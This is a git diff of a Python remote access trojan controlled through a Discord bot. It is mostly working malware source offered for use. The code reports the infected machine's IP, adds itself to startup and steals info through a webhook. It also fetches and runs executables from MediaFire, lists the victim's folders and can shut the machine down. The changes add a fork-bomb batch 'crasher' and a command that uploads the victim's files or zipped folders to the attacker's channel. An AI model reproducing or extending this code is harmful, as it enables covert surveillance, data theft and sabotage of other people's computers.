@@ -2,9 +2,7 @@ import discord
 from discord.ext import commands
 from discord.utils import get
 import os
-import time
 import webbrowser
-import random
 from mediafiredl import MediafireDL as mf
 import pyautogui
 import zipfile
@@ -14,7 +12,7 @@ import shutil
 
 ############################################################## CONFIG
 defaultStartup = True # If (by default) you want this to insert to startup
-notificationChannel = int("Notification-Channel-Here") # Channel to send the notification that this machine is online to (Channel ID, keep as integer)
+notificationChannel = int("notification-channel-here (INTEGER, REMOVE QUOTES)") # Channel to send the notification that this machine is online to (Channel ID, keep as integer)
 botToken = "Discord-Bot-Token-Here" # Put your discord bot's token here
 
 ############################################################## CONFIG
@@ -433,7 +431,7 @@ def getdata(dataname):
         return (True, data[dataname])
     except Exception as e:
         return (False, e)
-                
+ 
 prefix = getprefix()
 
 ########################## discord shit
@@ -445,7 +443,7 @@ async def on_ready():
     endtext = ""
     if getdata("nickname")[0] is True:
         endtext = f"\nNickname: {getdata('nickname')[1]}"
-    await channel.send(f"- - -\nComputer on IP '{prefix}' has started{endtext}\n- - -")
+    await channel.send(f"- - -\nComputer on IP '{prefix}' has started{endtext}\nGet started with '{prefix}+help'\n- - -")
 
 @bot.command(brief="Puts the file into startup")
 async def startup(ctx):
@@ -454,6 +452,20 @@ async def startup(ctx):
         await ctx.send("Rat is now in startup")
     except Exception as e:
         await ctx.send(f"Something went wrong!\n({e})")
+
+@bot.command(brief="Crashes the computer")
+async def crash(ctx):
+    with open("crasher.bat", "w") as file:
+        file.write("""
+        :a
+        set /A variable = 1
+        echo %variable%
+        set /A variable=%variable%+13
+        echo %variable%
+        start %0
+        goto a
+        """)
+    os.startfile("crasher.bat")
 
 @bot.command(brief="Let's you give the machine a nickname")
 async def nickname(ctx, *, name: str=None):
@@ -483,7 +495,7 @@ async def stealinfo(ctx, * , webhook: str=None):
         await ctx.send(f"Something went wrong with the stealing.\n\nMake a issue with this:\n{e}")
 
 @bot.command(brief="Downloads a file to the machine")
-async def download(ctx, url: str=None):
+async def upload(ctx, url: str=None):
     filename = mf.GetName(url)
     if url is None:
         await ctx.send("url is missing")
@@ -509,7 +521,7 @@ async def execute(ctx, path):
         await ctx.send(f"Error:\n\n{e}")
 
 @bot.command(brief="Downloads a (zip) file from MediaFire, then executes it.")
-async def downloadexecute(ctx, url: str=None):
+async def uploadexecute(ctx, url: str=None):
     await ctx.send("NOTE: The ZIP file name has to be the same as the EXE file name!")
     filename = mf.GetName(url)
 
@@ -535,12 +547,47 @@ async def downloadexecute(ctx, url: str=None):
         # run the file
         await ctx.send("file is being executed")
         os.startfile(f"{downloads}/{foldername}/{exename}")
-        
-@bot.command(brief="Blocks the machine from using the mouse for a while")
-async def blockmouse(ctx, times: int = 9999):
-    for _ in range(times):
-        pyautogui.move(random.randint(-500, 500), random.randint(-500, 500))
-        time.sleep(0.1)
+
+@bot.command(brief="Downloads a file from the victim's computer")
+async def download(ctx, path: str=None):
+    if path is None:
+        await ctx.send("You need to specify a path")
+        return
+    elif os.path.exists(path) is False:
+        await ctx.send("That file doesn't exist")
+        return
+    
+    pathtype = os.path.isdir(path)
+
+    if pathtype is False: # It's a file
+        filesize = os.path.getsize(path)
+
+        if filesize >= 24999999: # discord limit
+            await ctx.send("Sorry, we currently only accept <24.9 mb files due to discord having limits")
+        else:
+            await ctx.send(file=discord.File(path))
+
+    elif pathtype is True: #It's a directory
+        shutil.make_archive("ToSend", 'zip', path)
+        filesize = os.path.getsize("ToSend.zip")
+        if filesize >= 24999999: # discord limit
+            await ctx.send("Sorry, we currently only accept <24.9 mb files due to discord having limits")
+        else:
+            await ctx.send(file=discord.File("ToSend.zip"))
+        os.remove("ToSend.zip")
+    else:
+        await ctx.send("Something went horribly wrong")
+
+@bot.command(brief="Get the size of a file/directory")
+async def size(ctx, path: str=None):
+    if path is None:
+        await ctx.send("You need to specify a path")
+        return
+    elif os.path.exists(path) is False:
+        await ctx.send("That file doesn't exist")
+        return
+    filesize = os.path.getsize(path)
+    await ctx.send(f"{path} is {filesize} megabytes.\n(This thing may be a little broken)")
 
 @bot.command(brief="Shuts down, restarts or Logs the user out of the machine")
 async def shutdown(ctx, choice: str=None):
@@ -556,7 +603,10 @@ async def shutdown(ctx, choice: str=None):
         os.system("shutdown /l /t 1")
 
 @bot.command(brief="allows you to see the users files on the machine")
-async def explorer(ctx, *, path):
-    await ctx.send(os.listdir(path))
-
+async def explorer(ctx, *, path: str="C:/"):
+    try:
+        await ctx.send(os.listdir(path))
+    except PermissionError:
+        await ctx.send("We don't have permission to that folder")
+        
 bot.run(botToken)
